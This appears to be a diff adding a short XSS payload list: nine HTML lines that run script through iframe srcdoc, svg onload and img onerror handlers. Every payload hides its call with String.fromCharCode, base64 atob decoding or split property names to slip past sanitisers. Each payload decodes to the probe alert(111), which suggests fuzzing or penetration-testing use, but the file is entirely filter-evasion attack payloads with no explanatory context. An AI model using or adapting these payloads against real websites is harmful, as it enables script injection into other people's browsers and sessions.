@@ -1,0 +1,9 @@
+<iframe srcdoc="<script>eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))</script>">
+<iframe srcdoc="<img src=x onerror=eval(atob('YWxlcnQoMTExKQ=='))>">
+<svg onload='eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))'>
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMTExKQ=='))>">
+<iframe srcdoc="<script>window['al'+'ert'](111)</script>">
+<svg onload='eval(atob("YWxlcnQoMTExKQ=="))'>
+<iframe srcdoc="<svg onload=window['al'+'ert'](111)>">
+<iframe srcdoc="<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,49,49,41))>">
+<iframe srcdoc="<script>eval(atob('YWxlcnQoMTExKQ=='))</script>">
